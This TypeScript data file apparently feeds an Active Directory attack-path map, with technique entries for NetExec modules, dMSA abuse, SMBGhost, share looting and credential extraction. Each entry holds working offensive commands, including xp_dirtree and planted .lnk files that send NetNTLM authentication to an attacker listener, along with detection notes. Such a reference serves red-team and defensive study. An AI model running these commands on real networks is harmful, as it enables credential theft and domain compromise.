import type { AttackEdge, TechniqueNodeDef } from '../schema';

const r = String.raw;
const mitre = (id: string): { id: string; url: string } => ({
  id,
  url: `https://attack.mitre.org/techniques/${id.replace('.', '/')}/`,
});

/**
 * Gaps found auditing against NetExec (nxc): its wiki and module set. Each is a
 * technique/vector (NetExec is one of the tools). Web-verified; wired into the
 * existing categories with a forward continuation so none dead-ends.
 */
export const adNetexecNodes: TechniqueNodeDef[] = [
  {
    id: 'pre2k-auth',
    label: 'Pre-Windows 2000 Computer Accounts',
    phase: 'initial-access',
    summary: "Pre-staged computer accounts keep a predictable password (lowercased name) until first boot.",
    description:
      "A computer account pre-created with the 'pre-Windows 2000' flag gets an initial password equal to its own name in lowercase (e.g. WS01$ -> 'ws01'), truncated to 14 chars. Until that machine first boots and rotates its password, anyone who can enumerate these stale objects (WORKSTATION_TRUST_ACCOUNT with logonCount 0 / low pwdLastSet) can authenticate as the computer and request a TGT, a quiet foothold for further enumeration and delegation abuse.",
    tools: [
      { name: 'NetExec (pre2k)', url: 'https://www.netexec.wiki/ldap-protocol/pre2k' },
      { name: 'pre2k (garrettfoster13)', url: 'https://github.com/garrettfoster13/pre2k' },
    ],
    commands: [
      { label: 'Enumerate + try predictable passwords (NetExec)', code: r`netexec ldap dc01.corp.local -u user -p 'Password1' -M pre2k`, lang: 'bash' },
      { label: 'Standalone: hunt + grab a TGT', code: r`pre2k unauth -d corp.local -dc-ip 10.0.0.1`, lang: 'bash' },
    ],
    mitre: mitre('T1078.002'),
    references: [
      { label: 'NetExec Wiki, Pre2k', url: 'https://www.netexec.wiki/ldap-protocol/pre2k' },
      { label: 'The Hacker Recipes, Pre-Windows 2000 computers', url: 'https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers' },
    ],
    requires: ['Ability to enumerate domain objects (any account; sometimes anonymous)', 'A pre-staged computer object that has never logged on'],
    opsec: 'Spray-like Kerberos pre-auth failures (4771) across many computer names are detectable; a successful logon as a dormant machine account is anomalous. Quiet compared to most footholds.',
    difficulty: 'easy',
  },
  {
    id: 'badsuccessor-dmsa',
    label: 'BadSuccessor (dMSA Abuse)',
    phase: 'priv-esc',
    summary: 'Abuse delegated Managed Service Accounts on Server 2025 to inherit a target principal’s SIDs.',
    description:
      "Windows Server 2025 adds delegated Managed Service Accounts (dMSAs) with a migration mechanism. With CreateChild on any OU (or write over a dMSA), an attacker points msDS-ManagedAccountPrecededByLink at a target (e.g. a Domain Admin) and flips msDS-DelegatedMSAState. The KDC then mints the dMSA a PAC carrying the target's SIDs, succeeding the victim without touching their group membership or password. A single Server 2025 DC makes it viable (CVE-2025-53779).",
    tools: [
      { name: 'NetExec (badsuccessor)', url: 'https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py' },
      { name: 'SharpSuccessor', url: 'https://github.com/logangoins/SharpSuccessor' },
      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
    ],
    commands: [
      { label: 'bloodyAD', code: 'bloodyAD -u user -p pass -d domain.local --host dc01 add badSuccessor <dmsa-name>', lang: 'bash' },
      { label: 'Check the domain for exploitable dMSA OUs', code: r`netexec ldap dc01.corp.local -u user -p 'Password1' -M badsuccessor`, lang: 'bash' },
      { label: 'Create + link a dMSA to a target, then request its TGT', code: r`bloodyAD --host dc01.corp.local -d corp.local -u user -p 'Password1' add dMSA evilDMSA 'OU=Eval,DC=corp,DC=local'`, lang: 'bash' },
    ],
    mitre: mitre('T1078.002'),
    references: [
      { label: 'Akamai, BadSuccessor: Abusing dMSA', url: 'https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory' },
      { label: 'Unit 42, Exploiting Delegated MSAs', url: 'https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/' },
    ],
    requires: ['CreateChild on an OU, or write over a dMSA object', 'At least one Windows Server 2025 Domain Controller'],
    opsec: 'New dMSA objects and changes to msDS-ManagedAccountPrecededByLink / msDS-DelegatedMSAState are high-signal once detections exist (4662/5136). Stealthy where dMSA auditing is absent.',
    difficulty: 'medium',
  },
  {
    id: 'smbghost',
    label: 'SMBGhost (CVE-2020-0796)',
    phase: 'priv-esc',
    summary: 'Integer overflow in SMBv3.1.1 compression → kernel RCE / local SYSTEM.',
    description:
      "CVE-2020-0796 ('SMBGhost' / 'CoronaBlue') is a buffer overflow in the SMBv3.1.1 compression handler on Windows 10 / Server 1903-1909. A crafted compressed packet corrupts kernel memory for remote SYSTEM code execution; it is also a reliable local privilege escalation to SYSTEM. A peer of EternalBlue/ZeroLogon for unpatched legacy hosts.",
    tools: [
      { name: 'NetExec (smbghost)', url: 'https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/smbghost.py' },
      { name: 'chompie1337 SMBGhost RCE PoC', url: 'https://github.com/chompie1337/SMBGhost_RCE_PoC' },
    ],
    commands: [
      { label: 'Check a subnet for SMBGhost', code: r`netexec smb 10.0.0.0/24 -M smbghost`, lang: 'bash' },
    ],
    mitre: mitre('T1210'),
    references: [
      { label: 'NVD, CVE-2020-0796', url: 'https://nvd.nist.gov/vuln/detail/cve-2020-0796' },
      { label: 'NetExec module (smbghost.py)', url: 'https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/smbghost.py' },
    ],
    requires: ['Network access to TCP/445 on an unpatched Win10 / Server 1903-1909 host'],
    opsec: 'The kernel exploit is crash-prone (BSOD on failure) and loud; the vuln check itself is a benign protocol negotiation. Patched everywhere current, so legacy-host only.',
    difficulty: 'hard',
  },
  {
    id: 'smb-share-loot',
    label: 'SMB Share Spidering & Looting',
    phase: 'credential-access',
    summary: 'Crawl readable shares for passwords, configs, scripts, keys and backups.',
    description:
      'Open and over-shared SMB folders routinely hold credentials: scripts with embedded passwords, unattend.xml / web.config / .kdbx / .ppk / .pem files, runbooks and backups. With any domain creds, recursively spider every readable share, keyword/regex the names and contents, and pull hits. A low-skill, high-yield staple.',
    tools: [
      { name: 'NetExec (--spider / spider_plus)', url: 'https://www.netexec.wiki/smb-protocol/spidering-shares' },
      { name: 'Snaffler', url: 'https://github.com/SnaffCon/Snaffler' },
      { name: 'MANSPIDER', url: 'https://github.com/blacklanternsecurity/MANSPIDER' },
    ],
    commands: [
      { label: 'Inventory readable shares to JSON', code: r`netexec smb 10.0.0.0/24 -u user -p 'Password1' -M spider_plus`, lang: 'bash' },
      { label: 'Spider + download everything', code: r`netexec smb 10.0.0.0/24 -u user -p 'Password1' -M spider_plus -o DOWNLOAD_FLAG=True`, lang: 'bash' },
      { label: 'Built-in: grep share contents for "password"', code: r`netexec smb 10.0.0.20 -u user -p 'Password1' --spider SHARE --content --pattern password`, lang: 'bash' },
    ],
    mitre: mitre('T1552.001'),
    references: [
      { label: 'NetExec Wiki, Spidering Shares', url: 'https://www.netexec.wiki/smb-protocol/spidering-shares' },
      { label: 'The Hacker Recipes, Network shares', url: 'https://www.thehacker.recipes/ad/movement/credentials/dumping/network-shares' },
    ],
    requires: ['Any domain credentials with read access to one or more shares'],
    opsec: 'Mass file reads generate object-access events (5145) and are noisy at scale; targeted pattern searches are quieter.',
    difficulty: 'easy',
  },
  {
    id: 'ntlm-theft-files',
    label: 'NTLM Theft via Malicious Files',
    phase: 'credential-access',
    summary: 'Plant LNK/SCF/.searchConnector-ms files on writable shares so browsing users leak NetNTLM.',
    description: r`With write access to a frequented share, drop files whose icon/resource path points at an attacker UNC (\\attacker\share). When a user merely browses the folder in Explorer, Windows resolves the icon and authenticates to the attacker host, leaking the user's NetNTLMv2 to crack offline or relay. NetExec automates planting across writable shares (slinky=.lnk, scuffy=.scf, drop-sc=.searchConnector-ms, drop-library-ms=.library-ms / CVE-2025-24054); pair with Responder/ntlmrelayx.`,
    tools: [
      { name: 'NetExec (slinky / scuffy / drop-sc)', url: 'https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/slinky.py' },
      { name: 'ntlm_theft', url: 'https://github.com/Greenwolf/ntlm_theft' },
      { name: 'Responder', url: 'https://github.com/lgandx/Responder' },
    ],
    commands: [
      { label: 'Plant malicious .lnk on every writable share', code: r`netexec smb 10.0.0.0/24 -u user -p 'Password1' -M slinky -o NAME=docs SERVER=10.0.0.66`, lang: 'bash' },
      { label: 'Drop a .searchConnector-ms (also starts WebClient)', code: r`netexec smb 10.0.0.0/24 -u user -p 'Password1' -M drop-sc -o NAME=index SERVER=10.0.0.66`, lang: 'bash' },
      { label: 'Clean up planted files', code: r`netexec smb 10.0.0.0/24 -u user -p 'Password1' -M slinky -o CLEANUP=True`, lang: 'bash' },
    ],
    mitre: mitre('T1187'),
    references: [
      { label: 'Secure Ideas, NetExec SMB Slinky', url: 'https://www.secureideas.com/blog/no-broadcast-traffic-no-problem-netexec-smb-slinky-module' },
      { label: 'The Hacker Recipes, Living off the land', url: 'https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/living-off-the-land' },
    ],
    requires: ['Write access to a share that users browse', 'A listener (Responder / ntlmrelayx) to catch the auth'],
    opsec: 'Passive trap: it depends on a victim browsing the folder, but is very stealthy to plant. The captured auth (then crack or relay) is the higher-signal follow-on. Remember CLEANUP.',
    difficulty: 'easy',
  },
  {
    id: 'mssql-impersonation',
    label: 'MSSQL Impersonation Privesc',
    phase: 'priv-esc',
    summary: 'Abuse EXECUTE AS / IMPERSONATE grants to climb from a low-priv login to sysadmin (sa).',
    description:
      'SQL Server logins are often granted IMPERSONATE on higher-privileged principals (or db-chaining lets you EXECUTE AS another user). Enumerate who you can impersonate; if a path reaches a sysadmin, assume that context and you own the instance; then xp_cmdshell to SYSTEM on the host, or pivot via linked servers.',
    tools: [
      { name: 'NetExec (mssql_priv)', url: 'https://www.netexec.wiki/mssql-protocol/mssql-privesc' },
      { name: 'mssqlclient (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'PowerUpSQL', url: 'https://github.com/NetSPI/PowerUpSQL' },
    ],
    commands: [
      { label: 'Enumerate impersonation privesc paths', code: r`netexec mssql 10.0.0.30 -u user -p 'Password1' -M mssql_priv`, lang: 'bash' },
      { label: 'Escalate to sysadmin via impersonation', code: r`netexec mssql 10.0.0.30 -u user -p 'Password1' -M mssql_priv -o ACTION=privesc`, lang: 'bash' },
    ],
    mitre: mitre('T1078'),
    references: [
      { label: 'HackTricks, Pentesting MSSQL', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html' },
      { label: 'NetExec Wiki, MSSQL PrivEsc', url: 'https://www.netexec.wiki/mssql-protocol/mssql-privesc' },
      { label: 'HackTricks, Abusing AD MSSQL', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/abusing-ad-mssql.html' },
    ],
    requires: ['A valid SQL login (SQL or Windows auth) with IMPERSONATE / EXECUTE AS grants'],
    opsec: 'Impersonation and xp_cmdshell enablement are auditable SQL events; xp_cmdshell to SYSTEM is the loud part.',
    difficulty: 'medium',
  },
  {
    id: 'app-config-secrets',
    label: 'Stored App Credential Extraction',
    phase: 'credential-access',
    summary: 'Decrypt creds saved by admin tooling: mRemoteNG, Veeam, PuTTY, WinSCP, RDCMan.',
    description:
      'Admin workstations and jump boxes hoard reusable credentials inside connection-manager and backup tooling. mRemoteNG stores confCons.xml under a known static key (trivially decrypted); Veeam keeps backup-job creds in a local DB recoverable with admin rights; PuTTY/WinSCP/RDCMan/MobaXterm cache session secrets in the registry or profile files. These often yield service or domain-admin creds.',
    tools: [
      { name: 'NetExec (mremoteng / veeam / putty / rdcman)', url: 'https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-mremoteng' },
      { name: 'SharpDPAPI', url: 'https://github.com/GhostPack/SharpDPAPI' },
    ],
    commands: [
      { label: 'Decrypt mRemoteNG saved creds', code: r`netexec smb 10.0.0.20 -u admin -p 'Password1' -M mremoteng`, lang: 'bash' },
      { label: 'Dump Veeam backup credentials', code: r`netexec smb 10.0.0.20 -u admin -p 'Password1' -M veeam`, lang: 'bash' },
    ],
    mitre: mitre('T1555.005'),
    references: [
      { label: 'NetExec Wiki, Dump mRemoteNG', url: 'https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-mremoteng' },
      { label: 'NetExec Wiki, Dump Veeam', url: 'https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-veeam' },
    ],
    requires: ['Local admin / SYSTEM on the host holding the app config (some app files are user-readable)'],
    opsec: 'Reading config files / the Veeam DB is far quieter than touching LSASS and bypasses EDR LSASS focus. High-yield against admin jump boxes.',
    difficulty: 'easy',
  },
  {
    id: 'mssql-coerce',
    label: 'MSSQL NTLM Coercion',
    phase: 'credential-access',
    summary: 'Make the SQL service authenticate to you via xp_dirtree.',
    description:
      "Any MSSQL login, even a low-privileged one, can call xp_dirtree, xp_fileexist or xp_subdirs against an attacker UNC path (\\\\attacker\\share), forcing the SQL Server service account to authenticate over SMB. Capture the NetNTLM to crack offline, or relay it (to LDAP for RBCD, to ADCS, or to another SQL host). A quiet way to turn read-only database access into the service account's credentials. These are stored procedures enabled by default that need no elevated role.",
    tools: [
      { name: 'mssqlclient (Impacket)', url: 'https://github.com/fortra/impacket' },
      { name: 'NetExec (mssql)', url: 'https://github.com/Pennyw0rth/NetExec' },
      { name: 'Responder', url: 'https://github.com/lgandx/Responder' },
    ],
    commands: [
      { label: 'Coerce via xp_dirtree (interactive)', code: r`mssqlclient.py domain.local/user:'Password1'@10.0.0.30
SQL> EXEC master..xp_dirtree '\\10.0.0.66\share',1,1`, lang: 'bash' },
      { label: 'Coerce over NetExec', code: r`nxc mssql 10.0.0.30 -u user -p 'Password1' -x "EXEC master..xp_dirtree '\\10.0.0.66\share',1,1"`, lang: 'bash' },
    ],
    requires: ['Any MSSQL login (sysadmin not required)', 'A listener (Responder / ntlmrelayx) to catch the auth', 'MSSQL (1433) reachable'],
    mitre: mitre('T1187'),
    opsec: 'xp_dirtree is enabled by default and needs no elevated role: very low-friction. The outbound SMB from the SQL host to an unusual IP is the main signal; have your capture/relay listener running first.',
    difficulty: 'easy',
    references: [
      { label: 'HackTricks, Pentesting MSSQL', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html' },
    ],
  },
];

export const adNetexecEdges: AttackEdge[] = [
  // Parents (existing categories)
  { source: 'ad-cat-noauth', target: 'pre2k-auth' },
  { source: 'ad-cat-cve', target: 'smbghost' },
  { source: 'ad-cat-credaccess', target: 'smb-share-loot' },
  { source: 'ad-cat-mssql', target: 'mssql-impersonation' },
  { source: 'ad-cat-user-secrets', target: 'app-config-secrets' },
  // Forward continuations (so none dead-end)
  { source: 'pre2k-auth', target: 'valid-domain-creds', label: 'machine account' },
  { source: 'badsuccessor-dmsa', target: 'domain-admin', label: 'inherit target SIDs' },
  { source: 'smbghost', target: 'local-admin-host', label: 'SYSTEM' },
  { source: 'smb-share-loot', target: 'lateral-movement-cme', label: 'reuse looted creds' },
  { source: 'ntlm-theft-files', target: 'crack-netntlm' },
  { source: 'ntlm-theft-files', target: 'ntlm-relay' },
  { source: 'mssql-impersonation', target: 'mssql-exec', label: 'sysadmin → xp_cmdshell' },
  { source: 'app-config-secrets', target: 'lateral-movement-cme', label: 'reuse creds' },
  // MSSQL NTLM coercion → capture (crack) or relay, like the other coercion vectors
  { source: 'ad-cat-coercion', target: 'mssql-coerce' },
  { source: 'mssql-coerce', target: 'crack-netntlm', label: 'capture NetNTLM' },
  { source: 'mssql-coerce', target: 'ntlm-relay', label: 'relay the auth' },
];
